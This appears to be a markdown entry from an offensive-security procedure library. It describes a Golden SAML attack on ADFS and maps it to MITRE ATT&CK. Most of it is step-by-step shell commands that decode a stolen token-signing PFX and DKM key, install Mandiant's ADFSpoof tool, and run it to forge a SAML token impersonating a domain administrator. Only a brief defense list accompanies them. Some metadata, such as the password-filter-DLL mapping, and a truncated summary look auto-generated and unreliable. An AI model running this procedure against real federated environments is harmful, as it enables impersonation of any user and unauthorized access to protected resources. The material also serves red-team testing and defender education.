---
id: 64f5e3cd-9c45-486a-a194-db6eab915152
name: Golden SAML Attack via ADFS
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:06.596558+00:00'
updated_at: '2023-04-10T20:26:30.711218+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Persistence|TA0003 - Persistence]]'
techniques:
- '[[Modify Authentication Process|T1556 - Modify Authentication Process]]'
- '[[Unsecured Credentials|T1552 - Unsecured Credentials]]'
sub_techniques:
- '[[Password Filter DLL|T1556.002 - Password Filter DLL]]'
- '[[Private Keys|T1552.004 - Private Keys]]'
tags:
- '[[Active Directory Attacks]]'
- '[[Active Directory Federation Services]]'
- '[[ADFS - Golden SAML]]'
commands:
- '[[Clone cryptography and ADFSpoof repositories]]'
- '[[Create and activate virtual environment]]'
- '[[Decode Encrypted PFX]]'
- '[[Execute ADFSpoof.py with specified parameters]]'
- '[[Extract Private Key]]'
- '[[Install required Python packages]]'
---

# Golden SAML Attack via ADFS

## Summary

A Golden SAML attack is a technique used to forge SAML tokens and impersonate any users or services in a federated environment. By compromising the private key of a SAML signing certificate, an attacker can create any SAML token they desire, granting access to any resource in the federated environm

## Description

# Description

A Golden SAML attack is a technique used to forge SAML tokens and impersonate any users or services in a federated environment. By compromising the private key of a SAML signing certificate, an attacker can create any SAML token they desire, granting access to any resource in the federated environment. This specific procedure focuses on using the ADFS service to create a Golden SAML attack. By converting a PFX and private key to binary format and using the 'Create Golden SAML Attack' command, the attacker can create a forged SAML token and gain access to sensitive resources.

 

## Requirements

1. Access to an ADFS service

1. PFX and private key of a SAML signing certificate

 

## Defense

1. Ensure that the private key of SAML signing certificates is kept secure and not accessible to unauthorized users

1. Monitor for any suspicious activity, such as unusual logins or access to sensitive resources

1. Implement multi-factor authentication to prevent unauthorized access even if a SAML token is forged

 

## Objectives

1. Forge SAML tokens to impersonate any user or service in a federated environment

1. Gain unauthorized access to sensitive resources in the federated environment

 

# Instructions

1. This command is used to convert a PFX and private key to binary format.

 



**Code**: [[# For the pfx
echo AAAAAQAAAAAEE[...]Qla6 | base64]]



> The command has two parts. The first part converts the PFX to binary format and saves it to a file called EncryptedPfx.bin. The second part converts the private key to binary format and saves it to a file called dkmKey.bin. The PFX and private key must be provided in base64 and hexadecimal formats respectively.



**Command** ([[Decode Encrypted PFX]]):

```bash
echo AAAAAQAAAAAEE[...]Qla6 | base64 -d > EncryptedPfx.bin
```





**Command** ([[Extract Private Key]]):

```bash
echo f7404c7f[...]aabd8b | xxd -r -p > dkmKey.bin
```



2. To create a Golden SAML attack, follow these steps:
1. Create a directory named ADFSpoofTools.
2. Navigate to the ADFSpoofTools directory.
3. Clone the cryptography repository from https://github.com/dmb2168/cryptography.git.
4. Clone the ADFSpoof repository from https://github.com/mandiant/ADFSpoof.git.
5. Create a virtual environment named venvADFSSpoof.
6. Activate the venvADFSSpoof virtual environment.
7. Install the lxml and signxml packages using pip.
8. Uninstall cryptography using pip.
9. Navigate to the cryptography directory.
10. Install the cryptography package using pip.
11. Navigate to the ADFSpoof directory.
12. Install the requirements using pip.
13. Run the ADFSpoof.py script with the necessary arguments to create the Golden SAML attack.

 



**Code**: [[mkdir ADFSpoofTools
cd $_
git clone https://github]]



> The Golden SAML attack is a technique used to forge SAML tokens that are trusted by a target system. This can be used to gain access to resources that are protected by SAML-based authentication mechanisms. The ADFSpoof tool is a tool that can be used to create a Golden SAML attack. The instructions provided here explain how to use the ADFSpoof tool to create a Golden SAML attack. The commands in the data field of this JSON object should be run in order to create the Golden SAML attack.



**Command** ([[Clone cryptography and ADFSpoof repositories]]):

```bash
mkdir ADFSpoofTools
cd $_
git clone https://github.com/dmb2168/cryptography.git
git clone https://github.com/mandiant/ADFSpoof.git
```





**Command** ([[Create and activate virtual environment]]):

```bash
virtualenv3 venvADFSSpoof
source venvADFSSpoof/bin/activate
```





**Command** ([[Install required Python packages]]):

```bash
pip install lxml
pip install signxml
pip uninstall -y cryptography
cd cryptography
pip install -e .
cd ../ADFSpoof
pip install -r requirements.txt
```





**Command** ([[Execute ADFSpoof.py with specified parameters]]):

```bash
python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s adfs.pentest.lab saml2 --endpoint https://www.contoso.com/adfs/ls
/SamlResponseServlet --nameidformat urn:oasis:names:tc:SAML:2.0:nameid-format:transient --nameid 'PENTEST\\administrator' --rpidentifier Supervision --assertions '<Attribute Name="http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname"><AttributeValue>PENTEST\\administrator</AttributeValue></Attribute>'
```



## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]
- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Persistence|TA0003 - Persistence]]

### Techniques

- [[Modify Authentication Process|T1556 - Modify Authentication Process]]
- [[Unsecured Credentials|T1552 - Unsecured Credentials]]

### Sub-Techniques

- [[Password Filter DLL|T1556.002 - Password Filter DLL]]
- [[Private Keys|T1552.004 - Private Keys]]

## Commands Used

- [[Clone cryptography and ADFSpoof repositories]]
- [[Create and activate virtual environment]]
- [[Decode Encrypted PFX]]
- [[Execute ADFSpoof.py with specified parameters]]
- [[Extract Private Key]]
- [[Install required Python packages]]

## Tags

- [[Active Directory Attacks]]
- [[Active Directory Federation Services]]
- [[ADFS - Golden SAML]]


